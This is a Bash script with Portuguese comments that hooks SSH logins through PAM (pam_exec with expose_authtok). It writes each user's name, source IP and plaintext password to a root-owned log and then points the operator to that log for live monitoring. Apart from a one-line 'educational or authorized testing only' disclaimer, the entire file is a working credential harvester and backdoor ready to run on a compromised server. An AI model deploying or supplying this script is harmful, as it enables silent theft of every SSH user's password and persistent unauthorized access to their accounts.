#!/bin/bash
# Script para captura de credenciais SSH via PAM
# AVISO: Apenas para fins educacionais ou testes autorizados

# Verificar se está sendo executado como root
if [[ $EUID -ne 0 ]]; then
   echo "Este script precisa ser executado como root" 
   exit 1
fi

# Configurar arquivo de log com permissões restritas
LOG_FILE="/var/log/ssh_login.log"
touch "$LOG_FILE"
chmod 600 "$LOG_FILE"

# Verificar se a configuração já existe para evitar duplicação
if ! grep -q "pam_exec.so.*expose_authtok.*pam.sh" /etc/pam.d/sshd; then
    echo "auth optional pam_exec.so quiet expose_authtok /root/pam.sh" >> /etc/pam.d/sshd
    echo "Configuração PAM adicionada com sucesso."
else
    echo "Configuração PAM já existe."
fi

# Criar script PAM com informações adicionais
cat <<EOF > /root/pam.sh
#!/bin/bash

LOG_FILE="$LOG_FILE"
{
    echo "============================================="
    echo "Data e Hora: \$(date '+%d/%m/%Y %H:%M:%S')"
    echo "Usuário: \$PAM_USER"
    echo "IP de Origem: \$PAM_RHOST"
    echo "Serviço: \$PAM_SERVICE"
    echo "TTY: \$PAM_TTY"
    echo "Tipo: \$PAM_TYPE"
    echo "Senha: \$(cat -)"
    echo "============================================="
} >> \$LOG_FILE

# Não interferir no processo de autenticação
exit 0
EOF

# Aplicar permissões restritas ao script
chmod 700 /root/pam.sh

# Backup da configuração do SSH
cp /etc/pam.d/sshd /etc/pam.d/sshd.bak.$(date +%s)

echo "Configuração concluída!"
echo "Log de credenciais sendo salvo em $LOG_FILE"
echo "Execute 'tail -f $LOG_FILE' para monitorar em tempo real."
